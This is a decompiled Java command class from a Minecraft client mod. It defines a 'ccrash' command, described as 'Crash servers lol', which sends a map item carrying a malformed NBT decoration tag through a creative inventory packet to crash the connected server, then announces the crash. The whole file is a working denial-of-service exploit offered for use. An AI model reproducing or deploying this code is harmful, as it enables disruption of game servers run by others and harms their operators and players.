package co.crystaldev.client.command;

import co.crystaldev.client.Client;
import co.crystaldev.client.Reference;
import co.crystaldev.client.command.base.AbstractCommand;
import co.crystaldev.client.command.base.CommandInfo;
import co.crystaldev.client.command.base.args.CommandArguments;
import co.crystaldev.client.command.base.exceptions.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

@CommandInfo(name = "ccrash", description = "Crash servers lol")
public class CrashCommand extends AbstractCommand {
  public void execute(ICommandSender sender, CommandArguments arguments) throws CommandException {
    if (!this.mc.playerController.isInCreativeMode())
      throw new CommandException("You must be in creative mode!", new Object[0]); 
    ItemStack map = new ItemStack((Item)Items.filled_map);
    try {
      String tag = "{Decorations:[{id:\"OwOUwU\",type:100b}]}";
      map.setTagCompound(JsonToNBT.getTagFromJson(tag));
    } catch (NBTException ex) {
      Reference.LOGGER.error("Unable to set NBTTag for crash item.", (Throwable)ex);
      Client.sendErrorMessage((Exception)ex, true);
      return;
    } 
    this.mc.getNetHandler().addToSendQueue((Packet)new C10PacketCreativeInventoryAction(8, map));
    Client.sendMessage("Crashed " + Client.formatConnectedServerIp() + "!", true);
  }
}


/* Location:              C:\Users\Tim\AppData\Roaming\.minecraft\mods\temp\Crystal_Client-1.1.16-projectassfucker_1.jar!\co\crystaldev\client\command\CrashCommand.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */